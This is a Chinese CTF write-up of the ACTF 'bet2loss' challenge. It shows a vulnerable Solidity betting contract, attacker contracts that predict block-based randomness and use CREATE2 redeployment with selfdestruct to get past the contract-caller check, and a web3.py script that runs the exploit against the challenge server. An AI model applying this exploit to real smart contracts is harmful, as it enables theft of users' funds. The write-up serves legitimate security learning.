# ACTF writeup
本次ACTF中出现了三道区块链类型的题目，并且题目质量都很高。遗憾的是，我在比赛时没有完成一道。这里在赛后进行复盘。
## bet2loss 

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract BetToken {
    /* owner */
    address owner;
    /* token related */
    mapping(address => uint256) public balances;

    /* random related */
    uint256 nonce;
    uint256 cost;
    uint256 lasttime;
    mapping(address => bool) public airdroprecord;
    mapping(address => uint256) public logger;

    constructor() {
		owner = msg.sender;
        balances[msg.sender] = 100000;
        nonce = 0;
        cost = 10;
        lasttime = block.timestamp;
    }

    function seal(address to, uint256 amount) public {
		require(msg.sender == owner, "you are not owner");
        balances[to] += amount;
    }

    function checkWin(address candidate) public {
		require(msg.sender == owner, "you are not owner");
        require(candidate != owner, "you are cheating");
        require(balances[candidate] > 2000, "you still not win");
        balances[owner] += balances[candidate];
        balances[candidate] = 0;
    }

    function transferTo(address to, uint256 amount) public pure {
        require(amount == 0, "this function is not impelmented yet");
    }

    function airdrop() public {
        require(
            airdroprecord[msg.sender] == false,
            "you already got your airdop"
        );
        airdroprecord[msg.sender] = true;
        balances[msg.sender] += 30;
    }

    function bet(uint256 value, uint256 mod) public {
        address _addr = msg.sender;
        // make sure pseudo-random is strong
        require(lasttime != block.timestamp);
        require(mod >= 2 && mod <= 12);
        require(logger[msg.sender] <= 20);
        logger[msg.sender] += 1;

        require(balances[msg.sender] >= cost);
        // watchout, the sender need to approve such first
        balances[msg.sender] -= cost;

        // limit
        value = value % mod;

        // not contract
        uint32 size;
        assembly {
            size := extcodesize(_addr)
        }
        require(size == 0);

        // rnd gen
        uint256 rand = uint256(
            keccak256(
                abi.encodePacked(
                    nonce,
                    block.timestamp,
                    block.difficulty,
                    msg.sender
                )
            )
        ) % mod;
        nonce += 1;
        lasttime = block.timestamp;

        // for one, max to win 12 * 12 - 10 == 134
        // if 20 times all right, will win 2680
        if (value == rand) {
            balances[msg.sender] += cost * mod;
        }
    }
}
```

阅读源码可知，合约构建了一个赌场，每次投注都会生成一个随机数，这个**随机数是由区块的时间、难度、投注者的地址组成的**。用户初始可以Airdrop 30个token，每次投注都会扣除10个token。投注成功可以获得`cost*mod`个token的奖励。20轮之后，如果用户拥有2000个token以上，就可以得到flag。

合约中并没有实现`Transfer`方法，所以不能通过薅羊毛的方式去获取flag。

本题考察了**区块链上随机数的生成**以及**Create2操作码**的使用。题目中使用的随机数都是根据区块链上公开可以获取的信息生成的。因此，我们也可以用一个合约去**获取同一个区块上的同样的随机数**。这样便可以达到百发百中。

### 思路
刚开始的想法是，是在合约中使用call方法去调用，但是题目中要求**合约账户不能调用bet方法**。

这里我们使用CREATE2操作码，在**同一个地址上反复部署合约后自毁**，从而绕过非合约方法的验证。

其中`nonce`的值写在区块链中，需要通过`getStorageAt`方法获取。

### Create2

CREATE2 操作码，它允许我们提前计算出要部署的合约地址，地址计算公式如下：
``` solidity
keccak256 (0xff ++ address ++ salt ++ keccak256 (init_code)) [12:]
```
说明：

● address— 调用CREATE2的智能合约的地址

● salt— 随机数

● init_code— 要部署合约的字节码

可以在合约**构造函数constructor**中完成我们想要进行的操作，然后调用selfdestruct（）。与常见错误认识相反，其实你可以使用CREATE2操作码在同一地址多次部署智能合约。这是因为CREATE2检查目标地址的 nonce 是否为零（它会在构造函数的开头将其设置为1）。在这种情况下，selfdestruct（）函数每次都会重置地址的 nonce。因此，如果再次使用相同的参数调用CREATE2创建合约，对nonce的检查是可以通过的。

### 代码
**攻击合约**
``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./bet.sol";

contract Hacker {
    constructor(address target, uint256 mod) public {
        BigHacker b = BigHacker(msg.sender);
        uint256 nonce = b.nonce();
        uint256 value = 0;
        BetToken t = BetToken(target);
        if (t.balances(address(this)) == 0) {
            t.airdrop();
        }
        value = Hack(nonce, mod);
        t.bet(value, mod);
    }

    function Hack(uint256 nonce, uint256 mod) public view returns (uint256) {
        uint256 rand = uint256(
            keccak256(
                abi.encodePacked(
                    nonce,
                    block.timestamp,
                    block.difficulty,
                    address(this)
                )
            )
        ) % mod;
        return rand;
    }

    function die() public {
        selfdestruct(payable(address(0)));
    }
}


contract BigHacker {
    
    Hacker hk;
    address public a;
    event log_address(address);
    bytes32 public s = hex"42";
    uint256 public nonce;
    constructor(uint256 _nonce) public {
        nonce = _nonce;
    }
    function Hack(address target, uint256 mod) public {
        hk = new Hacker{salt: s}(target, mod);
        nonce++;
        a = address(hk);
        emit log_address(a);
        hk.die();
    }
}
```
**交互部署脚本**
``` python

import time
from eth_hash import Keccak256
from web3 import Web3
import requests
import json
from Crypto.Util.number import bytes_to_long

w3 = Web3(Web3.HTTPProvider('http://123.60.36.208:8545/'))

BigHacker_bytecode = open('output/BigHacker.bin', 'r').read()
BigHacker_abi = open('output/BigHacker.abi', 'r').read()
Hacker_bytecode = open('output/Hacker.bin', 'r').read()
acc = w3.eth.account.create()
hacker, sk_hacker = acc.address, acc.key

print('[+] hacker:', hacker)
assert requests.post(f'http://123.60.36.208:8080/api/claim', data = {'address': hacker}).status_code == 200
print('[+] waiting for test ether')
while w3.eth.get_balance(hacker) == 0:
    time.sleep(3)

print('[+] exploit start')

def deploy(src, data, value=0):
    return {
        "chainId": w3.eth.chain_id,
        "from": src,
        "gasPrice": w3.toWei(1,'wei'),
        "gas": 4700000,
        "value": w3.toWei(value,'wei'),
        "nonce": w3.eth.getTransactionCount(src),
        "data": data
}

nonce = w3.eth.getStorageAt('0x21ac0df70A628cdB042Dde6f4Eb6Cf49bDE00Ff7',2)
BigHacker_bytecode += nonce.hex()[2:]

signed_txn = w3.eth.account.signTransaction(deploy(hacker, BigHacker_bytecode), sk_hacker)
txn_hash = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex()
txn_receipt = w3.eth.waitForTransactionReceipt(txn_hash)
target = txn_receipt['contractAddress']
print('[+] BigHacker address:', target)

contract = w3.eth.contract(address=target, abi=BigHacker_abi)
for i in range(20):
    print('[+] attacking... Round:', i)
    TransactionData = contract.functions['Hack']('0x21ac0df70A628cdB042Dde6f4Eb6Cf49bDE00Ff7',12).buildTransaction({
        'chainId': w3.eth.chain_id,
        'from': hacker,
        'gas': 4700000,
        'gasPrice': w3.toWei(1,'wei'),
        'nonce': w3.eth.getTransactionCount(hacker),
        'value': w3.toWei(0,'wei')
        })
    signed_txn1 = w3.eth.account.signTransaction(TransactionData, sk_hacker)
    txn_hash1 = w3.eth.sendRawTransaction(signed_txn1.rawTransaction).hex()
    txn_receipt1 = w3.eth.waitForTransactionReceipt(txn_hash1)
```

```
ACTF{a_sTup1d_W3B_VUl_M4y_1e@D_7o_s3rIou$_w3b3_ImP4C7_666}
```
### 引用
[通过CREATE2获得合约地址：解决交易所充值账号问题](https://learnblockchain.cn/article/1297.html)
